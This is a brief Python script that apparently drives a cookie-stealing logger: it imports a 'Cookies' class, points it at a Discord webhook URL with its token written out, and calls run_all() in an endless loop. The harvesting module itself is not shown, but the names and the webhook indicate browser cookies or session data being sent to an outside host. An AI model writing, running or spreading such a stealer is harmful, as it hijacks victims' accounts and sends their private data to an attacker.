from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/970135541364453436/kZQVQpHj8pk-M5wn6PxDND7sGyeMRLl7VZf-TGHWhYSLS0C1NW2XZB9rVwuQKwsk-f9B')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
